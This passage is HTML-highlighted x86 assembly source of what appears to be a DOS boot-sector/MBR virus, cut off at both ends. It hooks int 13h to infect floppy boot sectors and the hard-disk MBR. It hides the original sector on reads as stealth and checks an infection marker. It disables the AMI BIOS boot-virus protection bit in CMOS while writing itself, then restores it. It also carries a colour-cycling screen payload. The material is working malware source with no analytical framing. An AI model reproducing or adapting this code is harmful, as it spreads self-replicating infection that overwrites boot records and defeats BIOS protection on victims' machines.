                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_boot_ok</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                 </span><span class="sc1">; if bad boot just loop here</span><span class="sc0">
</span><span class="sc5">error_loop1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">error_loop1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; else read original boot</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">error_loop2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_loop2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; and pass control to orig</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">; boot</span><span class="sc0">

</span><span class="sc5">find_cd18_rom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; to rom</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">loop_18h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">18cdh</span><span class="sc0">  </span><span class="sc1">; search int18h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loop_18h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">int05h_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; disable irq5</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; set video to 40x25</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">                </span><span class="sc1">; set cursor type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">101h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b800h</span><span class="sc0">               </span><span class="sc1">; on video mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc2">40d</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">25d</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7020h</span><span class="sc0">                </span><span class="sc1">; clear entire video</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">       </span><span class="sc1">; on data for payload</span><span class="sc0">
</span><span class="sc5">get_offset_vm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; get offset where to draw</span><span class="sc0">
</span><span class="sc5">out_text</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                  </span><span class="sc1">; if end get next offset</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_offset_vm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; end of entire stuff?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_text</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; leave text attributes</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">out_text</span><span class="sc0">
</span><span class="sc5">end_text</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc5">begin_cycle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_timer</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; get 3 random bits</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">begin_cycle</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; put in regs for color</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; changing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; just one bit for color reg</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; change. 1 will change (up or</span><span class="sc0">
                                                </span><span class="sc1">; down) while 0 no change</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; if max color then color will</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_inv1</span><span class="sc0">                 </span><span class="sc1">; decrease instead of</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc0">                      </span><span class="sc1">; increasing</span><span class="sc0">
</span><span class="sc5">no_inv1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; if max then invert</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_inv2</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">no_inv2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; if max then invert</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_inv3</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">no_inv3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; trough all the possible</span><span class="sc0">

</span><span class="sc5">cycle_components</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; end?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">begin_cycle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1010h</span><span class="sc0">                </span><span class="sc1">; set color register bx to</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                     </span><span class="sc1">; dh/ch/cl (r/g/b)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">                   </span><span class="sc1">; change the color components</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                   </span><span class="sc1">; as decided before</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">wait_loop0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">               </span><span class="sc1">; wait a bit here</span><span class="sc0">
</span><span class="sc5">wait_loop1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">wait_loop1</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">wait_loop0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">cycle_components</span><span class="sc0">  </span><span class="sc1">; again changing colors</span><span class="sc0">

</span><span class="sc5">int18h_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">; correct stack for int18h tech</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; reading or writing?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">chain_old</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">chain_old</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; possible boot/mbr?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">chain_old</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">chain_old</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; first disk or floppy?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">possible_infect</span><span class="sc0">
</span><span class="sc5">chain_old</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">orig13h</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">possible_infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_orig13h</span><span class="sc0">            </span><span class="sc1">; do the requested call</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">try_infect</span><span class="sc0">              </span><span class="sc1">; if succesfull then try to</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">bad_operation</span><span class="sc0">           </span><span class="sc1">; infect</span><span class="sc0">

</span><span class="sc5">try_infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">4ch</span><span class="sc0">  </span><span class="sc1">; already infected?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect_it</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; reading mbr?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect_it</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_boot_ok</span><span class="sc0">           </span><span class="sc1">; so check if infected and if</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                 </span><span class="sc1">; so set CX/DX to original copy</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_it</span><span class="sc0">               </span><span class="sc1">; else infect</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; read original -&gt; stealth</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_orig13h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_binf</span><span class="sc0">         </span><span class="sc1">; work done</span><span class="sc0">
</span><span class="sc5">infect_it</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">4ch</span><span class="sc0">  </span><span class="sc1">; infected? (but from fd)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_binf</span><span class="sc0">               </span><span class="sc1">; if so just leave</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_boot_ok</span><span class="sc0">   </span><span class="sc1">; check if boot/mbr is ok</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; ff= error, else in CX/DX we have</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_binf</span><span class="sc0">       </span><span class="sc1">; params where to write the virus</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; copy the user buffer (of the read</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; or write, so the floppy boot or mbr)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">; to our buffer at vir_seg:0</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">304h</span><span class="sc0">         </span><span class="sc1">; CX and DX already set to where to</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; write. So write 4 secs: orig boot/mbr</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_orig13h</span><span class="sc0">    </span><span class="sc1">; + virus body</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_binf</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_loader</span><span class="sc0">     </span><span class="sc1">; create loader that will load the</span><span class="sc0">
                                        </span><span class="sc1">; virus at boot</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_cmos_inf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc0">         </span><span class="sc1">; disable boot virus protection on</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_cmos_inf</span><span class="sc0">  </span><span class="sc1">; AMI bioses</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_orig13h</span><span class="sc0">    </span><span class="sc1">; write new boot/mbr with loader</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_cmos_inf</span><span class="sc0">  </span><span class="sc1">; restore the virus protection info</span><span class="sc0">
                                        </span><span class="sc1">; as it was before in cmos</span><span class="sc0">
</span><span class="sc5">exit_binf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">bad_operation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">call_orig13h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">orig13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">check_boot_ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_phys</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_fd_hd</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_vir</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_fd_hd</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">disk_here</span><span class="sc0">

</span><span class="sc1">; then we have a floppy. now the code sets in CX and DX the values where</span><span class="sc0">
</span><span class="sc1">; the virus is (if this routine is called at the boot time) or where the</span><span class="sc0">
</span><span class="sc1">; virus will be written (when this routine is called at infection). The</span><span class="sc0">
</span><span class="sc1">; virus will always put itself on four sectors of the floppy starting</span><span class="sc0">
</span><span class="sc1">; from the last track (calculated below), on the last side (so value at</span><span class="sc0">
</span><span class="sc1">; side in the boot sector - 1, since 0 means 1 side) and on the last 4</span><span class="sc0">
</span><span class="sc1">; sectors of the track.</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; total sectors</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; sectors per track</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; sides</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; sectors per track</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; last four</span><span class="sc0">

